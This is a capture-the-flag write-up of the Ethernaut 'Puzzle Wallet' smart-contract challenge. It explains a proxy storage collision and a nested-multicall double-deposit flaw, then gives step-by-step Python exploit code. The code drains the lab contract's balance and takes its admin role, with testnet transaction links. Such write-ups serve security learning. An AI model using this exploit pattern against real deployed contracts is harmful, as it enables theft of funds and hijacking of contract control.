# Puzzle Wallet

## Objectives

You'll need to hijack this wallet to become the admin of the proxy.

## Solution

The state variable layout of the PuzzleProxy contract and the PuzzleWallet contract is as follows:

| Storage slot | PuzzleProxy  | PuzzleWallet |
| ------------ | ------------ | ------------ |
| 0            | pendingAdmin | owner        |
| 1            | admin        | maxBalance   |

But as we know from the utility of proxies, the objective of proxies is to contain storage to allow contract implementations (logic contract) to be upgraded without having to replace contract storage in every upgrade. There's a problem with this storage layout, as there's state variables that some functions in PuzzleWallet modify like `setMaxBalance()`, the variables that PuzzleWallet will end up modifying through delegatecalls are the variables in PuzzleProxy.

If the developers intended PuzzleWallet variables like `owner` and `maxBalance` to have their own slot, they should have replicated the same storage layout in PuzzleProxy first and then add any additional variables in order to avoid storage collisions.

Therefore, we can follow these steps to become `admin`:

1. Call `proposeNewAdmin()` on PuzzleProxy passing your address as `_newAdmin` in order to become `owner`, as `owner` is also `pendingAdmin` because of the storage collision

**All subsequent steps past this point must be done through he proxy contract's fallback function which passes all calls to the PuzzleWallet contract using `delegatecall`. To do this, just perform a normal transaction with some encoded data pertaining to the function calls and inputs.**

2. Become whitelisted by calling `addToWhitelist()` passing your address as `addr` in order to pass the `onlyWhitelisted` modifier check.  

3. Create a transaction data bundle in order to call `multicall()`. The bundle should consist of two deposit transactions. However, the code doesn't allow for this, instead, the bundle should consist of a multicall bundle with the tx data for a `deposit()` call and a `multicall()` containing a `deposit()` call. Because the transaction is nested, this second `multicall()` that calls `deposit()` will not detect that we are calling deposit twice in a row.

4. Because we called `deposit()` twice but our tx value in that single tx was 0.001 ether, even though you only deposit 0.001 ether once, it still sums 0.001 ether twice to your address' balance in the `balance` mapping.

5. Now that your balance in the `balance` mapping is of 0.002 ether, you're able to withdraw the entire contract balance. To do so, call `execute()` with the entire contract balance in the `value` parameter of the function.

6. After draining the contract, you can now call `setMaxBalance()` by passing in your address casted as an integer, which will make `maxBalance` and therefore `admin` your address.

## How I did it

As described in [solution](#solution), but with a few resourceful changes in order to simplify the python code.

1. Get the position in the proxy contract's storage which contains the address of the implementation contract. I do this in order to be able to encode the calls to certain methods in this contract, which I could technically do manually by constructing a short JSON and encoding it as ABI, but using the contract code instance is easier. I think it's also possible to deploy an instance of the PuzzleWallet contract in order to do it.

```python
storage_position_impl_address = hex(int(web3.sha3(text='eip1967.proxy.implementation').hex(),16)-1)
implementation_address = f'0x{web3.eth.get_storage_at(puzzleproxy.address, storage_position_impl_address).hex()[-40:]}'
```

2. Get the PuzzleWallet contract instance and assign it to an object in python in order to encode the contract calls that will be passed to the proxy contract through the tx data.

```python
puzzlewallet = PuzzleWallet.at(implementation_address)
```

3. Call `proposeNewAdmin()` to become `pendingAdmin`

```python
puzzleproxy.proposeNewAdmin(acc.address, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xbd43b12ff9139f8e9916c46f7e2df7128c34bf6419130c2992d656d7df7453a1

Every single step after this one will perform a tx that sends tx data to the proxy contract in order to perform the delegate calls to the PuzzleWallet contract.

4. Call the `addToWhitelist()` function in order to whitelist my address

```python
whitelist_address_data = puzzlewallet.addToWhitelist.encode_input(acc.address)
acc.transfer(to=puzzleproxy.address, amount=0, data=whitelist_address_data)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xfbc79616c75d96e8a0d176b88197521a18b688bfc6286f01fb904335300c56c5

5. Create the multicall bundled transaction and call `multicall()` as specified in [solution](#solution) step 3.

```python
# multicall tx data
deposit_data = puzzlewallet.deposit.encode_input()
multicall_data = puzzlewallet.multicall.encode_input([deposit_data])
# nest the call
multicall_data = puzzlewallet.multicall.encode_input([deposit_data, multicall_data]) 
acc.transfer(to=puzzleproxy.address, amount=puzzleproxy.balance(), data=multicall_data)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x6e33c31f232cfb459d4bbd13f296a52be0606c680bde05732fd207f06306d205

6. Perform the withdrawal of all contract's funds by calling `execute()`.

```python
execute_data = puzzlewallet.execute.encode_input(acc.address, puzzleproxy.balance(), "")
acc.transfer(to=puzzleproxy.address, amount=0, data=execute_data)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xc856e1a011cc5405e67956a40ea59754342b41002ff860eeeb21b4b4ee949b97

7. Call `setMaxBalance()` in order to become `admin`

```python
max_balance_data = puzzlewallet.setMaxBalance.encode_input(int(acc.address, 16))
acc.transfer(to=puzzleproxy.address, amount=0, data=max_balance_data)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x3eae8adb1340f9e1837061e7150eeb863e35d2c403c86f0074389017c78e1903

8. Check if I'm admin

```python
# check if my address is the admin address
admin_assertion = puzzleproxy.admin() == acc.address
print(f'The admin of the contract is {acc.address}, therefore my address is admin: {admin_assertion}')
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x6bce85a663ae4b8b5d19fcc8b6fa400d2dc34b597dd67ce556107819e0742b36
